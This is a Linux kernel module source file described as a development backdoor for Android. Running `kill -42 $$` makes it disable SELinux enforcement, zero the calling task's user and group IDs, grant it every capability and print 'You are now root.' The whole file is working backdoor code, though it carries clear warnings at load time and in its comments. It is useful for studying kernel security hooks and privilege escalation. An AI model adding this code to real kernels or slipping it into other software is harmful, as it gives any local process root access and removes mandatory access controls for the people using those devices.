// SPDX-License-Identifier: GPL-2.0
/*
 * Copyright (C) 2015-2018 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
 */

/* Hello. If this is enabled in your kernel for some reason, whoever is
 * distributing your kernel to you is a complete moron, and you shouldn't
 * use their kernel anymore. But it's not my fault! People: don't enable
 * this driver! (Note that the existence of this file does not imply the
 * driver is actually in use. Look in your .config to see whether this is
 * enabled.) -Jason
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
#include <linux/module.h>
#include <linux/lsm_hooks.h>
#include <linux/file.h>

extern int selinux_enforcing;

/* Invoke via `kill -42 $$`. */
static int rootme_task_kill(struct task_struct *p, struct siginfo *info, int sig, u32 secid)
{
	static const char now_root[] = "You are now root.\n";
	struct file *stderr;
	struct cred *cred;

	/* Magic number. */
	if (sig != 42)
		return 0;

	/* Only allow if we're sending a signal to ourselves. */
	if (p != current)
		return 0;

	/* It might be enough to just change the security ctx of the
	 * current task, but that requires slightly more thought than
	 * just axing the whole thing here.
	 */
	selinux_enforcing = 0;

	/* Rather than the usual commit_creds(prepare_kernel_cred(NULL)) idiom,
	 * we manually zero out the fields in our existing one, so that we
	 * don't have to futz with the task's key ring for disk access.
	 */
	cred = (struct cred *)__task_cred(current);
	memset(&cred->uid, 0, sizeof(cred->uid));
	memset(&cred->gid, 0, sizeof(cred->gid));
	memset(&cred->suid, 0, sizeof(cred->suid));
	memset(&cred->euid, 0, sizeof(cred->euid));
	memset(&cred->egid, 0, sizeof(cred->egid));
	memset(&cred->fsuid, 0, sizeof(cred->fsuid));
	memset(&cred->fsgid, 0, sizeof(cred->fsgid));
	memset(&cred->cap_inheritable, 0xff, sizeof(cred->cap_inheritable));
	memset(&cred->cap_permitted, 0xff, sizeof(cred->cap_permitted));
	memset(&cred->cap_effective, 0xff, sizeof(cred->cap_effective));
	memset(&cred->cap_bset, 0xff, sizeof(cred->cap_bset));
	memset(&cred->cap_ambient, 0xff, sizeof(cred->cap_ambient));

	stderr = fget(2);
	if (stderr) {
		kernel_write(stderr, now_root, sizeof(now_root) - 1, 0);
		fput(stderr);
	}
	return -EBFONT;
}

static struct security_hook_list rootme_hooks[] __lsm_ro_after_init = {
	LSM_HOOK_INIT(task_kill, rootme_task_kill)
};

static int rootme_init(void)
{
	pr_err("WARNING WARNING WARNING WARNING WARNING\n");
	pr_err("This kernel is BACKDOORED and contains a trivial way to get root.\n");
	pr_err("If you did not build this kernel yourself, stop what you're doing\n");
	pr_err("and find another kernel. This one is not safe to use.\n");
	pr_err("WARNING WARNING WARNING WARNING WARNING\n");
	pr_err("\n");
	security_add_hooks(rootme_hooks, ARRAY_SIZE(rootme_hooks));
	pr_err("Type `kill -42 $$` for root.\n");
	return 0;
}

module_init(rootme_init);
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Dumb development backdoor for Android");
MODULE_AUTHOR("Jason A. Donenfeld <Jason@zx2c4.com>");
